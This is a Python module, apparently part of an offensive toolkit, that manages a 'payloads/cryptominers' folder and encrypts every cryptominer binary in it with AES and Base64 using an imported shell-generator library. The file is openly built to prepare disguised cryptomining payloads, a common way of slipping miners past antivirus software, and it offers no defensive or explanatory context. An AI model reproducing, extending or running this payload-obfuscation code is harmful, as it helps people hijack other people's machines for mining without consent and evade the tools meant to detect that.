import os
from shell_generator import encrypt_shell, generate_aes_key

CRYPTOMINERS_DIR = "payloads/cryptominers"

if not os.path.exists(CRYPTOMINERS_DIR):
    os.makedirs(CRYPTOMINERS_DIR)
    print(f"[INFO] Created directory for cryptominers: {CRYPTOMINERS_DIR}")

# Function: Encrypt Cryptominer Binaries
def encrypt_cryptominer_binaries(encryption_key):
    """
    Encrypt all binary files in the cryptominers directory using AES + Base64.

    :param encryption_key: AES encryption key to use for encryption.
    """
    if not os.path.exists(CRYPTOMINERS_DIR):
        print(f"[ERROR] Cryptominers directory not found: {CRYPTOMINERS_DIR}")
        return

    for file_name in os.listdir(CRYPTOMINERS_DIR):
        file_path = os.path.join(CRYPTOMINERS_DIR, file_name)
        if os.path.isfile(file_path):
            print(f"[INFO] Encrypting cryptominer: {file_name}")
            encrypt_shell(file_path, encryption_key)

def list_cryptominers():
    """
    List all cryptominer binaries in the cryptominers directory.
    """
    try:
        files = [f for f in os.listdir(CRYPTOMINERS_DIR) if os.path.isfile(os.path.join(CRYPTOMINERS_DIR, f))]
        if not files:
            print("[INFO] No cryptominers found in the cryptominers directory.")
            return []
        
        print("\n[ Available Cryptominers ]")
        for idx, file_name in enumerate(files, 1):
            print(f"{idx}.) {file_name}")
        return files
    except Exception as e:
        print(f"[ERROR] Failed to list cryptominers: {e}")
        return []

def encrypt_all_cryptominers():
    """
    Generate an AES key and encrypt all cryptominers in the directory.
    """
    print("[INFO] Generating AES key for cryptominer encryption...")
    aes_key = generate_aes_key()
    encrypt_cryptominer_binaries(aes_key)
